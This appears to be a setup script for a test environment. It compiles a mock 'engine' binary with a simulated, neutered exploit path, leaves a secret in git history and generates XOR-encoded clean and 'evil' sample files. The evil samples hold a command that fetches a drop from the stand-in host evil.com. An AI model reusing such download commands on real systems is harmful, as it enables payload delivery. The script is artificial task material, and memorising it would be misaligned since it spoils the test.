#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip gcc git strace
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    # 1. Setup the vendored package and binary
    mkdir -p /app/vendored/legacy-engine/bin
    cd /app/vendored/legacy-engine

    # Create the C source for the "proprietary" engine
    cat << 'EOF' > engine.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    FILE *sec = fopen("/home/user/.engine_secret", "r");
    if (!sec) {
        fprintf(stderr, "FATAL: Missing /home/user/.engine_secret\n");
        return 1;
    }
    char buf[32];
    if (fgets(buf, sizeof(buf), sec) == NULL || strncmp(buf, "a9f3b2c1", 8) != 0) {
        fprintf(stderr, "FATAL: Invalid secret.\n");
        fclose(sec);
        return 1;
    }
    fclose(sec);

    if (argc < 2) return 0;
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 1;

    char payload[1024] = {0};
    fread(payload, 1, 1023, f);
    fclose(f);

    // XOR decode with 0x42
    for(int i=0; i<1024 && payload[i]; i++) {
        payload[i] ^= 0x42;
    }

    if (strncmp(payload, "CMD:", 4) == 0) {
        // EVIL: Executes the decoded command (simulated exploit)
        system("/bin/true"); // Safe simulation of exploit
        return 139; // Simulate segfault/crash code
    } else {
        // CLEAN
        printf("Processed payload cleanly.\n");
        return 0;
    }
}
EOF

    gcc engine.c -o bin/engine
    rm engine.c

    # Git history forensics setup
    git config --global user.email "admin@example.com"
    git config --global user.name "Admin"
    git init
    echo "Initial commit" > README.md
    git add README.md
    git commit -m "Initial commit"

    echo "a9f3b2c1" > .engine_secret
    git add .engine_secret
    git commit -m "Add engine secret config"

    git rm .engine_secret
    git commit -m "Remove secret from repo, should be deployed separately"

    # 2. Setup the samples and corpora
    mkdir -p /app/samples /app/corpora/clean /app/corpora/evil

    generate_payload() {
        local type=$1
        local out=$2
        local content=""
        if [ "$type" == "clean" ]; then
            content="DAT:user_data_$RANDOM"
        else
            content="CMD:curl http://evil.com/drop_$RANDOM"
        fi

        # Python one-liner to XOR with 0x42
        python3 -c "import sys; sys.stdout.buffer.write(bytes([b ^ 0x42 for b in '$content'.encode()]))" > "$out"
    }

    # Generate samples
    generate_payload clean /app/samples/sample_clean_1.bin
    generate_payload clean /app/samples/sample_clean_2.bin
    generate_payload evil /app/samples/sample_exploit_1.bin
    generate_payload evil /app/samples/sample_exploit_2.bin

    # Generate corpora
    for i in $(seq 1 50); do
        generate_payload clean /app/corpora/clean/clean_$i.bin
        generate_payload evil /app/corpora/evil/evil_$i.bin
    done

    chown -R user:user /app
    chmod -R 777 /home/user
